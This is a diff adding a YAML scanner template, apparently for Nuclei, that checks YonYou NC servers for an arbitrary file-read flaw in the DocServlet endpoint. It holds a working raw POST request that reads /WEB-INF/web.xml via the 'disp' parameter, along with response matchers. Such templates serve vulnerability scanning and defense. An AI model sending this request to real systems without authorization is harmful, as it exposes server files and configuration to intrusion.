@@ -1,0 +1,28 @@
+id: YonYouNC-DocServlet-ReadAnyFile
+
+info:
+  name: YonYouNC-DocServlet-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    YonYouNC-DocServlet-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        POST /service/~webrt/nc.uap.lfw.file.action.DocServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pageId=login&disp=/WEB-INF/web.xml
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "filter-name>"
+          - "servlet-name>"
+        condition: and
